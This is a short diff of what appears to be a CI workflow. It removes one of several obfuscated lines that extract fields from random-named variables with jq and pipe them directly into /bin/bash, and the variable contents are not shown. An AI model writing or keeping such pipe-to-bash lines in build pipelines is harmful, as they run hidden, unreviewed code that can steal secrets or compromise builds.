@@ -29,7 +29,6 @@ jobs:
           echo $qt53 | jq -r .pv6968 | /bin/bash
           echo $daokd71 | jq -r .aps11926 | /bin/bash
           echo $prc69418 | jq -r .tqvbv06 | /bin/bash
-          printf '%s' "$mdkcw898" | jq -r .x6 | /bin/bash
           printf '%s' "$ejps5" | jq -r .ondr38104 | /bin/bash
           printf '%s' "$ndw99230" | jq -r .o6744 | /bin/bash
 
